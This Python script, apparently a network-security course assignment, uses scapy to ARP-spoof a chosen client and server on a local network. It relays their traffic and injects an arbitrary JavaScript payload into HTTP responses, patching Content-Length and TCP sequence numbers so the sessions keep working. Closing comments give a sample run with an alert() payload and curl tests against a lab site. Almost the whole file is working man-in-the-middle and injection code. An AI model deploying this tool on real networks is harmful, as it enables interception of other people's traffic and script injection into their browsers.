# largely copied from https://0x00sec.org/t/quick-n-dirty-arp-spoofing-in-python/487
from scapy.all import *

import argparse
import os
import re
import sys
import threading
import time

def parse_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", help="network interface to bind to", required=True)
    parser.add_argument("-ip1", "--clientIP", help="IP of the client", required=True)
    parser.add_argument("-ip2", "--serverIP", help="IP of the server", required=True)
    parser.add_argument("-s", "--script", help="script to inject", required=True)
    parser.add_argument("-v", "--verbosity", help="verbosity level (0-2)", default=0, type=int)
    return parser.parse_args()


def debug(s):
    global verbosity
    if verbosity >= 1:
        print('#{0}'.format(s))
        sys.stdout.flush()


# TODO: returns the mac address for an IP
def mac(IP):

    # Create an ARP request asking "Who has IP?"
    arp_request = ARP(pdst=IP)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")  # Send it to everyone
    arp_request_broadcast = broadcast / arp_request

    answered, unanswered = srp(arp_request_broadcast, timeout=2, verbose=0)

    for sent, received in answered:
        return received.hwsrc  # Return the MAC address from the reply

    return None  # In case no reply received


def spoof_thread(clientIP, clientMAC, serverIP, serverMAC, attackerIP, attackerMAC, interval = 3):
    while True:
        spoof(serverIP, attackerMAC, clientIP, clientMAC) # TODO: Spoof client ARP table
        spoof(clientIP, attackerMAC, serverIP, serverMAC) # TODO: Spoof server ARP table
        time.sleep(interval)


# TODO: spoof ARP so that dst changes its ARP table entry for src 
def spoof(srcIP, srcMAC, dstIP, dstMAC):

    # Build a fake ARP reply
    packet = ARP(op=2,    # 2 = "is-at" (reply)
                 psrc=srcIP,  # Pretend to be srcIP
                 hwsrc=attackerMAC,  # But use attacker's MAC instead
                 pdst=dstIP,  # Target dstIP
                 hwdst=dstMAC)  # Target's real MAC

    send(packet, verbose=0)

    debug(f"spoofing {dstIP}'s ARP table: setting {srcIP} to {srcMAC}")


# TODO: restore ARP so that dst changes its ARP table entry for src
def restore(srcIP, srcMAC, dstIP, dstMAC):
    
    # Build a correct ARP reply
    packet = ARP(op=2,    # 2 = "is-at" (ARP reply)
                 psrc=srcIP,  # Correct srcIP
                 hwsrc=srcMAC,  # Real srcMAC (not attacker MAC)
                 pdst=dstIP,  # Target dstIP
                 hwdst=dstMAC)  # Target's real MAC

    # send(packet, count=5, verbose=0)
    send(packet, verbose=0)

    debug(f"restoring ARP table for {dstIP}")


# TODO: handle intercepted packets
# NOTE: this intercepts all packets that are sent AND received by the attacker, so 
# you will want to filter out packets that you do not intend to intercept and forward
def interceptor(packet):
    global clientMAC, clientIP, serverMAC, serverIP, attackerMAC, script, injectDict, sessionDict

    # Only handle IP packets
    if not packet.haslayer(Ether) or not packet.haslayer(IP) or not packet.haslayer(TCP):
        return

    eth = packet[Ether]
    ip = packet[IP]
    tcp = packet[TCP]

    key = (ip.src, tcp.sport, ip.dst, tcp.dport)

    if tcp.flags.F:
        # print("Detected FIN Flag")
        sessionDict[key] = sessionDict.get(key, 0) + 1

    # client -> server
    if eth.src == clientMAC and ip.dst == serverIP:
        eth.dst = serverMAC
        tcp.ack -= injectDict.get(key, 0)  # client is acknowledging too much

    # server -> client
    elif eth.src == serverMAC and ip.dst == clientIP:
        eth.dst = clientMAC

        #HTTP Response
        if tcp.sport == 80 and packet.haslayer(Raw):
            payload = packet[Raw].load

            try:
                # Decode HTTP content (ignore errors just in case)
                html = payload.decode('utf-8', errors='ignore')

                # Inject script if "</body>" is found
                if "</body>" in html:
                    injected_html = html.replace("</body>", f"<script>{script}</script></body>", 1)

                    # Update Content-Length (only if Content-Length header is present)
                    content_length_search = re.search(r"Content-Length:\s*(\d+)", injected_html, re.IGNORECASE)
                    if content_length_search:
                        old_length = int(content_length_search.group(1))
                        new_length = old_length + len(f"<script>{script}</script>")
                        injected_html = re.sub(
                            r"(Content-Length:\s*)\d+",
                            lambda m: f"{m.group(1)}{new_length}",
                            injected_html,
                            flags=re.IGNORECASE
                        )

                    # Build new packet
                    new_packet = Ether(src=attackerMAC, dst=clientMAC) / \
                                 IP(src=ip.src, dst=ip.dst) / \
                                 TCP(sport=tcp.sport, dport=tcp.dport, seq=tcp.seq + injectDict.get(key, 0), ack=tcp.ack, flags=tcp.flags) / \
                                 injected_html

                    injectDict[key] = injectDict.get(key, 0) + len(f"<script>{script}</script>")
                    sendp(new_packet, verbose=0)

                    # Reset state when connection is closed
                    if sessionDict.get(key, 0) == 2 and tcp.flags.A:
                        # print("HTTP session ended")
                        injectDict.pop(key, None)  # Does nothing if key doesn't exist
                        sessionDict.pop(key, None)

                    return  # Done, don't forward the original

            except Exception as e:
                # print(f"Failed to inject: {e}")
                exit(0)

    # Ignore irrelevant packets?
    else:
        
        # Reset state when connection is closed
        if sessionDict.get(key, 0) == 2 and tcp.flags.A:
            # print("HTTP session ended")
            injectDict.pop(key, None)  # Does nothing if key doesn't exist
            sessionDict.pop(key, None)
            
        return

    eth.src = attackerMAC  # Always set our own MAC as source
    sendp(packet, verbose=0)

    # Reset state when connection is closed
    if sessionDict.get(key, 0) == 2 and tcp.flags.A:
        # print("HTTP session ended")
        injectDict.pop(key, None)  # Does nothing if key doesn't exist
        sessionDict.pop(key, None)


if __name__ == "__main__":
    args = parse_arguments()
    verbosity = args.verbosity
    if verbosity < 2:
        conf.verb = 0 # minimize scapy verbosity
    conf.iface = args.interface # set default interface

    clientIP = args.clientIP
    serverIP = args.serverIP
    attackerIP = get_if_addr(args.interface)

    clientMAC = mac(clientIP)
    serverMAC = mac(serverIP)
    attackerMAC = get_if_hwaddr(args.interface)

    script = args.script

    injectDict = {}
    sessionDict = {}

    # start a new thread to ARP spoof in a loop
    spoof_th = threading.Thread(target=spoof_thread, args=(clientIP, clientMAC, serverIP, serverMAC, attackerIP, attackerMAC), daemon=True)
    spoof_th.start()

    # start a new thread to prevent from blocking on sniff, which can delay/prevent KeyboardInterrupt
    sniff_th = threading.Thread(target=sniff, kwargs={'prn':interceptor}, daemon=True)
    sniff_th.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        restore(clientIP, clientMAC, serverIP, serverMAC)
        restore(serverIP, serverMAC, clientIP, clientMAC)
        sys.exit(1)

    restore(clientIP, clientMAC, serverIP, serverMAC)
    restore(serverIP, serverMAC, clientIP, clientMAC)

# python3 cp2.1.http.py -i eth0 --clientIP 10.4.22.209 --serverIP 10.4.22.201 --script 'alert("Successful Injection!")'

# curl -i http://www.bankofbailey.com/index.html
# curl -i http://www.bankofbailey.com/long.html
# curl -i http://www.bankofbailey.com http://www.bankofbailey.com
